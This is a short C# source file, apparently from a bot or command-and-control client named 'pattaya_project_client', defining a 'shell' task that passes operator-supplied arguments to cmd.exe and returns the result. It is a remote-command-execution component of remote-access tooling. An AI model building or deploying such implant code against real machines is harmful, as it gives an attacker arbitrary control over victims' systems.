using pattaya_project_client.Commands.Interfaces;
using pattaya_project_client.Models;
using pattaya_project_client.Services;

namespace pattaya_project_client.Commands.Implements
{
    public class Shell : BotCommand
    {
        public override string TaskName => "shell";

        public override string RunTask(BotTask task)
        {
            return Execute.ExecuteCommand(@"C:\Windows\System32\cmd.exe", $"/c {task.Arguments}");
        }
    }
}
